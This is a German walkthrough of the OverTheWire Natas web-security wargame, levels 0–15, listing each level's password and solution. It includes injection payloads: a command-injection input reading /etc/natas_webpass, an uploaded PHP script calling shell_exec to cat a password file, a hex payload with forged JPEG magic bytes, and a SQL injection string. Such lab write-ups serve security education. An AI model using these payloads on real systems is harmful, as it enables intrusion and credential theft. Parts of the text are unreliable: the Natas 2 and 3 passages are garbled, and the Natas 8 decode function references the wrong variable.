# Natas 0

Zugriff:	[http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org)
Username: `natas0`
Passwort: `natas0`

Das Passwort für Natas1 ist im Seitenquelltext als Kommentar hinterlegt.

# Natas 1
Zugriff:	[http://natas1.natas.labs.overthewire.org](http://natas1.natas.labs.overthewire.org)
Username: `natas1`
Passwort: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

Das Passwort für Natas2 lässt sich wie folgt auslesen: Mit `F12` den Debugger öffnen und im Haupt-Thread auf `index` navigieren. Dort ist das Passwort als Kommentar hinterlegt.

# Natas 2
Zugriff:	[http://natas2.natas.labs.overthewire.org](http://natas2.natas.labs.overthewire.org)
Username: `natas2`
Passwort: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

Im Quelltext der Seite befindet sich ein il een oe it `iesien neeben tSmi ist klrdas sich ter er dresse natas.natas.labs.overthewire.org/fies in aerzeichnis t.
Beim Aufrufen des Verzeichnisses finde i neen erxel.pnateiaheine tate mit de Naen user.tt. n dieer indet sich das asswUser.zxzort r eel 

# Natas 3
Zugriff:	[http://natas3.natas.labs.overthewire.org](http://natas.natas.labs.overthewire.org)
Username: `natas3`
Passwort: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

Im Quelltext der Seite befindet sich folgender inwis:o mre information les ot even oole wi fnd i this t.
Dies ist ein Hinweis auf die Robots.txt, welche das Verhalten der Roboter der Suchmaschinen beeinflusst. 
> https://wiki.selfhtml.org/wiki/Grundlagen/Robots.txt

Da sich die robots.txt immer im Root-Verzeichnis der Website befindet, können wir diese über http://natas3.natas.labs.overthewire.org/robots.txt aufrufen.
In dieser finden wir das Verzeichnis `/s3cr3t/`.
Beim Aufrufen des Verzeichnisses finden wir wie in Level 2 eine users.txt, welche das Passwort für das folgende Level enthällt.


# Natas 4
Zugriff:	[http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org)
Username: `natas4`
Passwort: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

Natas 4 begrüßt uns mit der Nachricht:
> Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Als Lösung kommen hier die HTTP-Header ins Spiel:
> https://de.wikipedia.org/wiki/Liste_der_HTTP-Headerfelder

Diese lassen sich zum Beispiel durch dass Add-on "Tamper" bearbeiten.
Nun kann der Http-Referer von "http://natas4.natas.labs.overthewire.org/" zu "http://natas5.natas.labs.overthewire.org/" geändert werden.

Beim Neuladen der Seite geben wir so nun vor, von der Natas5 Seite zu kommen, was die Lösung dieses Levels ist. 

# Natas 5
Zugriff:	[http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org)
Username: `natas5`
Passwort: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

Der Starttext von Natas5 lautet: 
> Access disallowed. You are not logged in

Im Cookieverzeichnis der Website findet sich ein Cookie mit dem Namen "loggedin". Wenn wir diesen auf "1" setzen und die Seite neuladen, erhalten wir das Passwort für Natas6.

# Natas 6
Zugriff:	[http://natas6.natas.labs.overthewire.org](http://natas6.natas.labs.overthewire.org)
Username: `natas6`
Passwort: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

Bei diesem Level erhalten wir einen Link zum Sourcecode der Seite:
```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
```
Die Lösung liegt hier in der Zeile `"includes/secret.inc";`
Beim Aufruf dieser Datei finden wir eine leere Datei vor, jedoch befindet sich das "secret"-Wort als Kommentar im Quelltext.

# Natas 7
Zugriff:	[http://natas7.natas.labs.overthewire.org](http://natas7.natas.labs.overthewire.org)
Username: `natas7`
Passwort: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

Beim Klicken auf die Links "Home" und "About" sieht man, dass an die URL die Parameter "?page=home" oder "?page=about" angehängt werden.
Im Quelltext findet man den Hinweis, dass sich das Passwort in einer Datei unter dem Pfad `/etc/natas_webpass/natas8` befindet.

>https://en.wikipedia.org/wiki/File_inclusion_vulnerability

Mit dem Wissen über die File-inclusion-vulnerability können wir nun versuchen uns das Passwort ausgeben zu lassen, in dem wir den Pfad als Parameter übergeben: `?page=/etc/natas_webpass/natas8`
Daraufhin gibt uns die Seite das Passwort für Natas8 aus.

# Natas 8
Zugriff:	[http://natas8.natas.labs.overthewire.org](http://natas8.natas.labs.overthewire.org)
Username: `natas8`
Passwort: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

Im Sourcecode sieht man folgenden Code:

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

Um auf die Variable `$secret` zu kommen, muss man die Funktionen umdrehen. 

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($encodedSecret) {
    return base64_decode(strrev(hex2bin($secret)));
}
```

# Natas 9

Zugriff:	[http://natas9.natas.labs.overthewire.org](http://natas9.natas.labs.overthewire.org)
Username: `natas9`
Passwort: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

Im Sourcecode sieht man folgenden Code:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Wir können mit dem input `$key` einen modifizierten bash Befehl ausführen.  Alle Passwörter sind im Ordner `/etc/natas_webpass` gespeichert. Über grep können wir auch in der Datei suchen.

Input: `[A-z] /etc/natas_webpass/natas11`

# Natas 10

Zugriff:	[http://natas10.natas.labs.overthewire.org](http://natas10.natas.labs.overthewire.org)
Username: `natas10`
Passwort: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

Einige Zeichen sind nicht erlaubt. Man muss nur den Input anpassen: `. /etc/natas_webpass/natas11`

# Natas 11

Zugriff:	[http://natas11.natas.labs.overthewire.org](http://natas11.natas.labs.overthewire.org)
Username: `natas11`
Passwort: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

Nachbau der XOR Funktion. 
out = in ⊕ key ist äquivalent zu key = out ⊕ in

```php
$in = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));

function xor_encrypt($in) {
    $key = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D");
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt($in);
```

```php
>> qw8J
```

```php
$in = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));

function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt($in));
```

Cookie mit `showpassword=yes`: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

# Natas 12

Zugriff:	[http://natas12.natas.labs.overthewire.org](http://natas12.natas.labs.overthewire.org)
Username: `natas12`
Passwort: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

Der Upload ist nicht auf JPG's beschränkt. Im hidden input der Form, kann `value` verändert werde. Der Name der Datei ist random, aber nicht die Dateiendung. Man kann hier ein eigenes php Skript hochladen, das das Passwort ausgibt.

```php
<?
echo(shell_exec('cat /etc/natas_webpass/natas13'));
?>
```

# Natas 13

Zugriff:	[http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)
Username: `natas13`
Passwort: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY `

Die Funktion `exif_imagetype` überprüft die ersten Hex-stellen einer Datei, um zu verifizieren, dass die Datei ein Bild ist. Man kann die File Signature eines jpg's `FF D8 FF` vor eine php Datei mit einem Hex Editor einfügen, um den Check zu umgehen. 

```
FF D8 FF 3C 3F 0D 0A 65 63 68 6F 28 73 68 65 6C 6C 5F 65 78 65 63 28 27 63 61 74 20 2F 65 74 63 2F 6E 61 74 61 73 5F 77 65 62 70 61 73 73 2F 6E 61 74 61 73 31 34 27 29 29 3B 0D 0A
```

# Natas 14

Zugriff:	[http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org)
Username: `natas14`
Passwort: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1  `

Passwort über SQL Injection auslesbar. Input im Passwortfeld: `" or "1" = "1` 
Im Get kann debug aktiviert werden, z.B. über OWASP ZAP. 

# Natas 15

Zugriff:	[http://natas15.natas.labs.overthewire.org](http://natas15.natas.labs.overthewire.org)
Username: `natas15`
Passwort: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  `